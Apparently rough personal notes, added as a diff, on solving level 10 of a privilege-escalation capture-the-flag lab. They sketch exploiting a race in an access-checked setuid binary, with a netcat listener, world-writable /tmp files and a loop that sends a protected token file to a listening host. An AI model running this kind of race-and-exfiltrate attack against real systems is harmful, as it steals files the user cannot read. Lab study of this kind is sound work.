@@ -1,0 +1,28 @@
+LEVEL10
+ls
+-> level10 token
+./level10 
+
+ltrace ->./level10 file host -> man acess
+	sends file to host if you have access to it
+strings ./level10 token 
+-> Connecting to %s:6969 
+
+    ifconfig
+    nc -lk 6969
+
+echo hello > /tmp/hello
+chmod 777 /tmp/hello
+
+    ->hello
+
+vim /tmp/main.c > main.c
+touch /tmp/file;
+chmod 777 /tmp/file
+
+    ssh level10@192.168.56.101 -p 42
+
+# while true; do ./level10 token 92.168.1.47; done
+
+getflag
+token : 
